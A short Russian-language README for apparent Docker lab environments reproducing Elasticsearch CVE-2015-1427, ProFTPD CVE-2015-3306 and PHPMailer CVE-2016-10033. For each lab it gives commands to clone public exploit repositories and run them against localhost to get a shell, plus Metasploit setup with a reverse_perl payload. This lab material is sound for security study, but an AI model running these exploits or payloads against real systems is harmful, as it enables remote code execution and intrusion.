lanaulbul
===
---

Все видео-эксплойты предоставлены на диске: https://drive.google.com/drive/folders/1GefOkyF3B7xLvMCLmc5W5yNB3mVxVcvn?usp=sharing 

CVE-2015-1427
===
docker version: 20.10.11

OS: CentOs 8

image name: elasticsearch
 
The Groovy scripting engine in Elasticsearch before 1.3.8 and 1.4.x before 1.4.3 allows remote attackers to bypass the sandbox protection mechanism and execute arbitrary shell commands via a crafted script. 

Как запустить
---
```
git clone https://github.com/XiphosResearch/exploits.git
cd exploits/ElasticSearch
sudo yum install python2
python2 elastic_shell.py localhost
```
Получаем шелл в контейнере
CVE-2015-3306
===
docker version: 20.10.11

OS: CentOs 8

image name: proftpd

The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands. 

Как запустить сторонний эксплойт
---
```
git clone https://github.com/t0kx/exploit-CVE-2015-3306.git
cd exploit-CVE-2015-3306
python3 ./exploit.py --host localhost --port 21 --path "/var/www/html/"
```

Тот же результат через метасплоит:
Установка metasploit
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall
```
Запуск metasploit
```
msfconsole
```
Команды в metasploit
```
search ftpd
use 13
set payload /cmd/unix/reverse_perl
set rhosts 192.168.1.79
set sitepath /var/www/html
set lhost 192.168.1.79
run
```
CVE-2016-10033
===
docker version: 20.10.11

OS: CentOs 8

image name: mailer

Как запустить сторонний эксплойт
---
```
git clone https://github.com/opsxcq/exploit-CVE-2016-10033.git
cd exploit-CVE-2016-10033
./exploit localhost:8383
```
получаем шелл
	
